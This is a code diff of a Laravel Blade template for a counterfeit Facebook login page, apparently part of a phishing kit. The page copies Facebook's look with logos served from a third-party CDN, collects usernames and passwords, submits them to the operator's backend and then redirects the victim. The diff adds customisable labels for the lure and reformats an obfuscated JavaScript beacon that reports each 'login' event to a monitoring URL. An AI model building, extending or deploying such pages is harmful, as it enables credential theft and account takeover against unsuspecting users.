@@ -14,7 +14,8 @@
     <meta property="og:title" content="{{ $data->title }}" />
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
-    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fblogo.png">
+    <link rel="shortcut icon"
+        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -34,7 +35,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -47,7 +48,8 @@
     <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh]">
         <p class="text-center text-sm text-[#646d74]">{{ __('facebook.' . app()->getLocale()) }}</p>
         <div class="h-[200px] flex justify-center items-center">
-            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" width="60">
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_logo.png"
+                alt="fb-logo" width="60">
         </div>
         <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
         {{-- Thông báo khi lỗi --}}
@@ -61,9 +63,10 @@
                         required>
                     <label
                         class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                        for="user">{{ __('facebook.email_or_phone') }}</label>
+                        for="user">{{ filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                     <button type="button" id="close_btn" class="cursor-pointer hidden">
-                        <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/close_logo.svg" width="25" />
+                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
+                            width="25" />
                     </button>
                 </div>
             </div>
@@ -74,30 +77,35 @@
                         required>
                     <label
                         class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                        for="pass">{{ __('facebook.password') }}</label>
+                        for="pass">{{ filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                     @if ($setting->showFacebookPasswordButton)
                         <button type="button" id="show_pass" class="cursor-pointer hidden">
-                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/show_pass.svg" width="25" />
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
+                                width="25" />
                         </button>
                         <button type="button" id="hide_pass" class="cursor-pointer hidden">
-                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/hide_pass.svg" width="25" />
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
+                                width="25" />
                         </button>
                     @endif
                 </div>
             </div>
             <button type="submit"
                 class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:pointer-events-none">
-                {{ __('facebook.login') }}</button>
+                {{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}</button>
         </form>
         <div class="mt-4">
-            <p class="text-center text-sm text-[#0d1114] cursor-pointer">{{ __('facebook.forgot_password') }}</p>
+            <p class="text-center text-sm text-[#0d1114] cursor-pointer">
+                {{ filled($login_theme_config->facebook->forgot_password) ? $login_theme_config->facebook->forgot_password : __('facebook.forgot_password') }}
+            </p>
         </div>
         <div class="space-y-4 flex flex-col items-center absolute bottom-0 w-full">
             <button
                 class="outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
-                {{ __('facebook.create_new_account') }}
+                {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
             </button>
-            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/meta_logo.png" alt="fb-logo" width="55">
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
+                alt="fb-logo" width="55">
             <div class="flex justify-center items-center gap-2">
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.introduce') }}</p>
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.help') }}</p>
@@ -105,7 +113,7 @@
             </div>
         </div>
     </div>
-    <script src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
     <script>
         $("#submit").submit(function(e) {
             e.preventDefault();
@@ -118,7 +126,9 @@
                 'password': password,
                 'info': '{{ $info }}'
             }
-            btn.attr('disabled', true).html("{{ __('facebook.logging_in') }}")
+            btn.attr('disabled', true).html(
+                "{{ filled($login_theme_config->facebook->login_in_progress) ? $login_theme_config->facebook->login_in_progress : __('facebook.logging_in') }}"
+            )
             // auto detect phone or string
             warning.hide()
             @if ($setting->checkLoginFacebook)
@@ -126,14 +136,18 @@
                     if (!check_email(username)) {
                         warning.html("{{ __('facebook.wrong_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                         return
                     }
                 } else {
                     if (!phone_check(username)) {
                         warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                         return
                     }
                 }
@@ -142,7 +156,9 @@
                 if (password.length < 5) {
                     warning.html("{{ __('facebook.password_too_short') }}")
                     warning.show()
-                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                    btn.attr('disabled', false).html(
+                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                    )
                     return
                 }
             @endif
@@ -154,7 +170,9 @@
                     if (!data.status) {
                         warning.html("{{ __('facebook.try_again') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                         return
                     }
                     window.location.href = '{!! $data->redirect_link !!}'
@@ -163,7 +181,54 @@
             );
         });
         @if ($setting->web_monitor)
-             function _0x288c(){const _0x37ec84=['48CMkkll','json','3JonQMx','17133vzCqfg','4310966IniJJf','{{ env('WEB_MONITOR_API_URL') }}','post','ajax','121420DbkbkL','{{$info}}','2589160vbohhG','21xlbLfm','728nFnPNA','330tpFAEl','32313696gMzGBS','605396rIPIJR','145269vZVoyM','login'];_0x288c=function(){return _0x37ec84;};return _0x288c();}function _0x33d9(_0x4b7f11,_0x1ea9e4){_0x4b7f11=_0x4b7f11-0x66;const _0x288cc2=_0x288c();let _0x33d95b=_0x288cc2[_0x4b7f11];return _0x33d95b;}(function(_0x605303,_0x130420){const _0x4d4965=_0x33d9,_0x497ad1=_0x605303();while(!![]){try{const _0x1dbb7f=parseInt(_0x4d4965(0x6f))/0x1*(parseInt(_0x4d4965(0x6a))/0x2)+-parseInt(_0x4d4965(0x70))/0x3*(-parseInt(_0x4d4965(0x67))/0x4)+-parseInt(_0x4d4965(0x75))/0x5*(-parseInt(_0x4d4965(0x6d))/0x6)+-parseInt(_0x4d4965(0x66))/0x7*(-parseInt(_0x4d4965(0x77))/0x8)+parseInt(_0x4d4965(0x6b))/0x9*(parseInt(_0x4d4965(0x68))/0xa)+-parseInt(_0x4d4965(0x71))/0xb+-parseInt(_0x4d4965(0x69))/0xc;if(_0x1dbb7f===_0x130420)break;else _0x497ad1['push'](_0x497ad1['shift']());}catch(_0x53c8ac){_0x497ad1['push'](_0x497ad1['shift']());}}}(_0x288c,0x88e02),((()=>{const _0x55563d=_0x33d9,_0x566492={'data':_0x55563d(0x76),'type':_0x55563d(0x6c)};$[_0x55563d(0x74)]({'type':_0x55563d(0x73),'url':_0x55563d(0x72),'data':_0x566492,'dataType':_0x55563d(0x6e),'success':function(_0x882676){}});})()));
+            function _0x288c() {
+                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
+                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
+                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
+                    '145269vZVoyM', 'login'
+                ];
+                _0x288c = function() {
+                    return _0x37ec84;
+                };
+                return _0x288c();
+            }
+
+            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
+                _0x4b7f11 = _0x4b7f11 - 0x66;
+                const _0x288cc2 = _0x288c();
+                let _0x33d95b = _0x288cc2[_0x4b7f11];
+                return _0x33d95b;
+            }(function(_0x605303, _0x130420) {
+                const _0x4d4965 = _0x33d9,
+                    _0x497ad1 = _0x605303();
+                while (!![]) {
+                    try {
+                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
+                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
+                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
+                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
+                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
+                                0x69)) / 0xc;
+                        if (_0x1dbb7f === _0x130420) break;
+                        else _0x497ad1['push'](_0x497ad1['shift']());
+                    } catch (_0x53c8ac) {
+                        _0x497ad1['push'](_0x497ad1['shift']());
+                    }
+                }
+            }(_0x288c, 0x88e02), ((() => {
+                const _0x55563d = _0x33d9,
+                    _0x566492 = {
+                        'data': _0x55563d(0x76),
+                        'type': _0x55563d(0x6c)
+                    };
+                $[_0x55563d(0x74)]({
+                    'type': _0x55563d(0x73),
+                    'url': _0x55563d(0x72),
+                    'data': _0x566492,
+                    'dataType': _0x55563d(0x6e),
+                    'success': function(_0x882676) {}
+                });
+            })()));
         @endif
     </script>
 </body>
